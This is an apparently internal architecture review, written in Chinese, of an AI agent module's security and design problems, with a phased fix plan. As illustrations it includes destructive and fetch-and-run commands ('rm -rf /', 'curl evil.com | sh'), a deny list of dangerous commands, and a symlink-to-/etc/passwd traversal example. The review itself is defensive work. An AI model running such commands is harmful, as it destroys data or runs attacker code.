# coobee-ai AI 模块 — 架构问题清单与改进方案

> 生成时间：2026-02-14  
> 评审方法：三位虚拟架构师分别从「结构与职责」「依赖与一致性」「安全与可扩展性」三个维度独立评审，最终汇总交叉验证  
> 参考标杆：OpenClaw 架构设计

---

## 一、问题总览

### 按严重程度分布

| 等级     | 数量 | 范围                 |
| -------- | ---- | -------------------- |
| Critical | 3    | 安全漏洞、架构根基   |
| High     | 8    | 功能缺陷、一致性问题 |
| Medium   | 6    | 技术债务、设计冗余   |
| Low      | 3    | 优化空间             |

---

## 二、Critical 问题

### C-1. exec 工具无命令白名单与 allowlist 学习

**位置**：`tools/builtin/exec.ts`

**现状**：exec 直接 `spawn(command, { shell: true })`，仅依赖 HITL 审批，无命令级过滤。

**风险**：用户批准后 LLM 可执行任意命令（`rm -rf /`、`curl evil.com | sh`）。

**对比 OpenClaw**：8 级策略过滤 + `safeBins`/`skillBins` 白名单 + allowlist 学习。

**改进方案**：

1. 引入 `ExecPolicy` 配置：`security: deny | allowlist | full`，`ask: off | on-miss | always`
2. 内置 `safeBins` 白名单（`ls`, `cat`, `pwd`, `git`, `npm`, `node` 等）
3. allowlist 学习：`approve-always` 时将命令模式加入白名单
4. 危险命令黑名单/模式匹配（`rm -rf`, `mkfs`, `dd`, `curl | sh` 等）

---

### C-2. Extension 系统无沙箱隔离

**位置**：`src/main/common/extension/ExtensionLoader.ts`

**现状**：`jiti.import(entryPath)` 直接在主进程中执行 Extension 代码，无任何隔离。

**风险**：恶意 Extension 可执行任意 Node.js 代码、访问文件系统、发起网络请求。

**改进方案**：

1. **P0**：Extension 来源校验（manifest 签名或哈希校验）
2. **P1**：Extension 在 Worker 线程中运行，通过 MessagePort 通信
3. **P2**：使用 `isolated-vm` 或类似方案限制 `require` 和全局对象访问
4. 明确文档化 Extension 信任模型

---

### C-3. path-guard 未检查符号链接穿越

**位置**：`sandbox/path-guard.ts` 第 46–76 行

**现状**：仅用 `path.resolve()` + `path.relative()` 做字符串比较，未 `realpath` 解析符号链接。

**风险**：工作区内的 symlink 可指向系统任意文件（如 `ln -s /etc/passwd link`），通过 `read('link')` 绕过守卫。

**改进方案**：

```
resolveSandboxPath(filePath, context):
  1. path.resolve(root, filePath)
  2. 检查 resolve 结果是否在 root 内（现有逻辑）
  3. fs.realpathSync(resolved)  ← 新增
  4. 检查 realpath 结果是否仍在 root 内  ← 新增
  5. 若文件不存在，检查最近存在的祖先目录的 realpath
```

---

## 三、High 问题

### H-1. AgentExecutor 职责过重（God Object）

**位置**：`AgentExecutor.ts`（925 行）

**问题**：同时承担执行调度、Builder 工厂、环境注入、Extension Hook、事件写入、HITL 编排。

**改进方案**：
| 职责 | 目标文件/类 |
|------|-------------|
| PiMonoBuilder | `runtime/pimono/PiMonoBuilder.ts` |
| OpenAIBuilder | `runtime/openai/OpenAIBuilder.ts` |
| injectEnv | `AgentEnvInjector.ts`（独立服务） |
| Extension Hook | 复用已有 `ExtensionHookRunner` |
| events.jsonl | `EventLogger.ts` 或 `AgentEventWriter.ts` |
| AgentExecutor | 仅保留 busy 锁 + stream/submit + HITL 循环编排 |

预计重构后 AgentExecutor 缩减至 300 行以下。

---

### H-2. SDK 依赖不一致

**问题**：tools/ 已 SDK 无关化，但 teams/orchestration/swarm 直接 `import { Agent, run } from '@openai/agents'`。

**影响**：

- Swarm/Team/Orchestrator 无法使用 PiMono Runtime
- 架构方向割裂

**改进方案**：

- **短期**：在文档中标注 teams/orchestration/swarm 为「OpenAI 专用」模块
- **中期**：引入 `IAgentFactory` 接口，抽象 Agent 创建和 run 调用
- **长期**：统一多 Agent 编排框架，基于 `AgentRuntime` 接口而非具体 SDK

---

### H-3. 沙箱模式未真正参与 exec 执行

**位置**：`PiMonoAgentRuntime.ts` 第 902–907 行，`OpenAIAgentRuntime.ts` 第 851–856 行

**问题**：`sandboxContext` 在 Runtime 内硬编码为 `mode: 'path-only'`，`toolPolicy: { rules: [] }`。`resolveSandboxContext()` 存在但未被调用。

**改进方案**：

1. `AgentExecutor.injectEnv()` 中调用 `resolveSandboxContext(config)` 生成上下文
2. 通过 Builder 注入 `SandboxContext` 到 Runtime
3. exec 工具根据 `sandboxContext.mode` 决定执行方式（local / docker）

---

### H-4. memory/ 模块整体未接入

**位置**：`memory/` 下 7 个文件

**问题**：SessionMemoryStore、ShortTermMemory、WorkingMemoryStore、LongTermMemoryStore、SessionAdapter 均无业务代码引用，仅在测试中使用。

**改进方案**：

- **选项 A**（推荐）：承认为「设计储备」，在文档中标注状态，避免误解
- **选项 B**：删除未接入模块，保留 `types.ts` 作为接口定义
- **选项 C**：接入 LongTermMemoryStore 到 `memory` 工具，替代文件存储

---

### H-5. LongTermMemoryStore 与 memory 工具概念重叠

**问题**：两套长期记忆机制并存：

- `LongTermMemoryStore`（SQLite，支持 embedding/importance）— 未使用
- `tools/builtin/memory.ts`（文件系统，Markdown/JSON）— 在用

**改进方案**：统一为一套。建议 `memory` 工具调用 `LongTermMemoryStore` 作为后端，文件存储作为 fallback。

---

### H-6. HITL 仅依赖前端，无备用审批渠道

**位置**：`hitl/HitlApprovalManager.ts`

**问题**：前端断开或崩溃时，审批请求等待 120 秒后超时，可能导致 Agent 执行中断。

**改进方案**：

1. 增加 CLI 审批渠道（macOS 原生 Dialog、Terminal prompt）
2. 支持配置超时默认策略（`reject-all` / `approve-safe` / `reject-all`）
3. 待审批请求持久化，前端重连后恢复

---

### H-7. Builder API 不一致

**问题**：PiMonoBuilder 和 OpenAIBuilder 的同概念配置使用不同名称：
| 概念 | PiMono | OpenAI |
|------|--------|--------|
| 工作区 | `cwd()` | `workspaceRoot()` |
| 压缩 | `compaction()` | `compression()` |
| API Key | `apiKey()` | ❌ |

**改进方案**：

1. 在两个 Builder 上统一方法名（如都用 `workspaceRoot()`，内部映射）
2. 或抽取 `AgentBuilder` 基类/接口，定义公共 API

---

### H-8. Swarm/Team 共享工作空间，存在竞态

**问题**：多个 Agent 共享 `workspaceRoot`，无文件锁，`write`/`edit` 同一文件会冲突。

**改进方案**：

1. `edit` 工具的 `oldText` 匹配天然提供乐观锁能力（已有）
2. 任务分配时避免多 Agent 修改同一文件
3. 或为每个 Agent 分配独立工作目录

---

## 四、Medium 问题

### M-1. monitoring/ 和 guardrails/ 为死代码

**位置**：`monitoring/`、`guardrails/`

**改进方案**：删除或移到 `experimental/`，更新 README。

---

### M-2. README 与实现严重不符

**位置**：`src/main/ai/README.md`

**不一致点**：

- 列出不存在的目录（`agents/`、`gateway/`、`index.ts`）
- 使用过时 API（`runtimeFactory`、`@openai/agents` 的 `tool()`）
- Skill 描述过时

**改进方案**：按 `01-architecture-overview.md` 重写 README。

---

### M-3. ProcessRegistry 无最大进程数限制

**改进方案**：增加 `MAX_PROCESSES = 20`，`register()` 超限时返回错误。

---

### M-4. memory 工具路径校验未解析符号链接

**改进方案**：复用 `resolveSandboxPath` 或增加 `realpath` 解析。

---

### M-5. StreamStore 失败后丢弃消息

**改进方案**：失败时写入死信文件或本地队列，而非静默丢弃。

---

### M-6. tools re-export ProcessRegistry 职责混淆

**改进方案**：从 `tools/index.ts` 和 `tools/builtin/index.ts` 移除 ProcessRegistry re-export，直接从 `process/ProcessRegistry` 导入。

---

## 五、Low 问题

### L-1. Observability 工具的 AsyncGenerator 使用价值有限

4 个只读工具（session_status 等）仅做一次 `yield` 后 `return`，AsyncGenerator 模式为样板代码。

**改进方案**：保持现状（统一接口优先），或未来引入 `executeSync` 重载。

---

### L-2. skill_list 暴露绝对路径

**改进方案**：可返回相对于 workspace 的路径，或仅返回 Skill 名称。

---

### L-3. AgentRuntimeOptions 索引签名过宽

**改进方案**：使用泛型或显式可选字段替代 `[key: string]: unknown`。

---

## 六、改进优先级排列

### Phase 1（P0 — 安全基础）

| 编号 | 任务                       | 工作量 |
| ---- | -------------------------- | ------ |
| C-1  | exec 命令白名单 + 黑名单   | 2-3 天 |
| C-3  | path-guard 符号链接检查    | 0.5 天 |
| M-4  | memory 路径校验统一        | 0.5 天 |
| M-3  | ProcessRegistry 进程数限制 | 0.5 天 |

### Phase 2（P1 — 架构清理）

| 编号 | 任务                                    | 工作量 |
| ---- | --------------------------------------- | ------ |
| H-1  | AgentExecutor 拆分                      | 2-3 天 |
| M-1  | 删除 monitoring/guardrails 死代码       | 0.5 天 |
| M-2  | 重写 README                             | 0.5 天 |
| M-6  | 移除 tools 的 ProcessRegistry re-export | 0.5 天 |
| H-4  | memory/ 模块状态标注                    | 0.5 天 |

### Phase 3（P2 — 一致性）

| 编号 | 任务              | 工作量 |
| ---- | ----------------- | ------ |
| H-7  | Builder API 统一  | 1-2 天 |
| H-3  | 沙箱模式真正接入  | 1-2 天 |
| H-2  | SDK 依赖标注/抽象 | 2-3 天 |
| H-5  | 长期记忆统一      | 2-3 天 |

### Phase 4（P3 — 可靠性与安全增强）

| 编号 | 任务                 | 工作量 |
| ---- | -------------------- | ------ |
| C-2  | Extension 沙箱隔离   | 3-5 天 |
| H-6  | HITL 备用审批渠道    | 2-3 天 |
| H-8  | 多 Agent 竞态防护    | 1-2 天 |
| M-5  | StreamStore 死信队列 | 1 天   |

---

## 七、总结

当前架构的**核心执行链路**（AgentExecutor → Runtime → Tools → Streaming）设计合理，工具系统已完成 SDK 无关化。主要问题集中在：

1. **安全层不完整**：exec 无命令过滤、path-guard 无 symlink 检查、Extension 无沙箱
2. **架构清理不彻底**：死代码（monitoring/guardrails/memory/）、README 过时、AgentExecutor 过重
3. **多运行时一致性**：tools 已抽象但 teams/orchestration/swarm 仍绑定 @openai/agents
4. **生产就绪度**：HITL 单渠道、进程无上限、StreamStore 消息可丢失

建议按 Phase 1-4 顺序推进，优先解决安全问题，再做架构清理和一致性改进。
